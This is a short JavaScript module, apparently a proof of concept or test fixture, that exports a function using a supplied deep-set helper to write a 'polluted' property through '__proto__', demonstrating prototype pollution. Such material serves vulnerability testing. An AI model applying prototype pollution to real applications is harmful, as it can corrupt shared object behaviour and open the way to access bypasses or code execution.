function exploitFunction(payload) {
    const { deepSet, targetObj } = payload;
    deepSet(targetObj, "__proto__.polluted", "yes");
}

module.exports = { exploitFunction };